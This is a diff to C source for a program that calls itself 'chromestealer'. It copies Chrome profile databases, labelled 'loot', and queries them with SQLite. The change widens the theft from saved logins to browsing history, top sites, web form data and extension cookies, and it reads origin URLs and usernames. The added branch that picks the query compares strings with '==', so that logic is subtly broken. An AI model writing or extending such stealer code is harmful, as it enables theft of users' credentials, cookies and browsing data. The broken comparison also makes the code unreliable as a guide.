@@ -359,16 +359,35 @@ int main(int argc, char *argv[]){
     };
     //DEBUG printf("[+] Finished copying database file. Querying data...\n");
     //send in the right query
-    if(strcmp(loot[i], "Login Data") == 0){
+    if(
+      strcmp(loot[i], "Login Data") == 0 || 
+      strcmp(loot[i], "History") == 0    ||
+      strcmp(loot[i], "Top Sites") == 0  ||
+      strcmp(loot[i], "Web Data") == 0   ||
+      strcmp(loot[i], "Extension Cookies") == 0
+    ){
       if(sqlite3_open(dest, &db) != SQLITE_OK){
         printf("[!] Error opening database: %s\n", sqlite3_errmsg(db));
         return -1;
       }
-      if(sqlite3_prepare_v2(db, sql.loginData, -1, &stmt, 0) != SQLITE_OK){
+      //pick the right statement
+      char* sqlreq;
+      if(loot[i] == "Login Data"){
+        sqlreq = sql.loginData;
+      }else if(loot[i] == "History"){
+        sqlreq = sql.history;
+      }else if(loot[i] == "Top Sites"){
+        sqlreq = sql.topSites;
+      }else if(loot[i] == "Web Data"){
+        sqlreq = sql.webData;
+      }else{
+        sqlreq = sql.extensionCookies;
+      }
+      if(sqlite3_prepare_v2(db, sqlreq, -1, &stmt, 0) != SQLITE_OK){
         printf("[!] Error preparing sql statement\n");
         return -1;
       }
-      //step through rows
+      //TODO step through rows
       while(sqlite3_step(stmt) == SQLITE_ROW){
         const char* origin_url = sqlite3_column_text(stmt, 0);
         const char* username_value = sqlite3_column_text(stmt, 1);
@@ -390,6 +409,7 @@ int main(int argc, char *argv[]){
       }
       if(sqlite3_finalize(stmt) != SQLITE_OK){
         printf("[!] Error finalizing statement\n");
+        return -1;
       }
       if(sqlite3_close(db) != SQLITE_OK){
         printf("[!] Error closing DB: %s\n", sqlite3_errmsg(db));
@@ -400,7 +420,7 @@ int main(int argc, char *argv[]){
     free(src);
   };
   
-  printf("chromestealer complete");
+  printf("chromestealer run done");
   free(decodedKey);
   return 0;
 }
